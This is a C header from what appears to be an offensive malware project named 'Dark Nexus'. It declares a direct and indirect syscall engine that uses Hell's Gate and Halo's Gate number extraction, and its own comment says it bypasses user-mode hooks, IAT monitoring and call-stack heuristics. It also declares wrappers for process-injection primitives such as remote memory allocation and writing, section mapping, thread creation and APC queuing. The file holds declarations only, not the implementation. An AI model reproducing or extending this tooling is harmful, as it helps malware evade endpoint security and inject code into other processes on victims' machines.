#ifndef DN_SYSCALLS_H
#define DN_SYSCALLS_H

#include <windows.h>

/*
 * Dark Nexus - Direct Syscall Engine
 *
 * Hell's Gate + Halo's Gate SSN extraction from ntdll stub prologues.
 * Indirect syscalls via gadget in ntdll .text to keep return address
 * pointing at ntdll, not our module.
 *
 * Bypasses: user-mode inline hooks, IAT monitoring, call stack heuristics
 */

// Syscall descriptor: holds the SSN and the address of a
// 'syscall; ret' gadget inside ntdll .text for indirect invocation
typedef struct _DN_SYSCALL {
    DWORD   ssn;            // syscall number
    PVOID   syscall_addr;   // address of 'syscall; ret' gadget in ntdll
    BOOL    resolved;
} DN_SYSCALL;

// Syscall table: one entry per Nt function we use
typedef struct _DN_SYSCALL_TABLE {
    DN_SYSCALL NtAllocateVirtualMemory;
    DN_SYSCALL NtWriteVirtualMemory;
    DN_SYSCALL NtProtectVirtualMemory;
    DN_SYSCALL NtCreateThreadEx;
    DN_SYSCALL NtOpenProcess;
    DN_SYSCALL NtClose;
    DN_SYSCALL NtWaitForSingleObject;
    DN_SYSCALL NtQueryVirtualMemory;
    DN_SYSCALL NtFreeVirtualMemory;
    DN_SYSCALL NtCreateSection;
    DN_SYSCALL NtMapViewOfSection;
    DN_SYSCALL NtUnmapViewOfSection;
    DN_SYSCALL NtQueueApcThread;
    DN_SYSCALL NtResumeThread;
    DN_SYSCALL NtDelayExecution;
} DN_SYSCALL_TABLE;

// Global syscall table
extern DN_SYSCALL_TABLE g_SyscallTable;

// Initialize the syscall table by extracting SSNs from ntdll
// Returns TRUE if all critical syscalls were resolved
BOOL dn_syscalls_init(void);

// Execute a syscall indirectly through the ntdll gadget
// These are implemented in assembly (syscall_stubs.asm)
extern NTSTATUS DnNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect
);
extern NTSTATUS DnNtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten
);
extern NTSTATUS DnNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect
);
extern NTSTATUS DnNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaxStackSize, PVOID AttributeList
);
extern NTSTATUS DnNtOpenProcess(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PVOID ClientId
);
extern NTSTATUS DnNtClose(HANDLE Handle);
extern NTSTATUS DnNtWaitForSingleObject(
    HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout
);
extern NTSTATUS DnNtQueryVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress,
    DWORD MemoryInformationClass, PVOID MemoryInformation,
    SIZE_T MemoryInformationLength, PSIZE_T ReturnLength
);
extern NTSTATUS DnNtFreeVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG FreeType
);
extern NTSTATUS DnNtCreateSection(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle
);
extern NTSTATUS DnNtMapViewOfSection(
    HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType,
    ULONG Win32Protect
);
extern NTSTATUS DnNtUnmapViewOfSection(
    HANDLE ProcessHandle, PVOID BaseAddress
);
extern NTSTATUS DnNtQueueApcThread(
    HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcArgument1,
    PVOID ApcArgument2, PVOID ApcArgument3
);
extern NTSTATUS DnNtResumeThread(
    HANDLE ThreadHandle, PULONG PreviousSuspendCount
);
extern NTSTATUS DnNtDelayExecution(
    BOOLEAN Alertable, PLARGE_INTEGER DelayInterval
);

#endif // DN_SYSCALLS_H
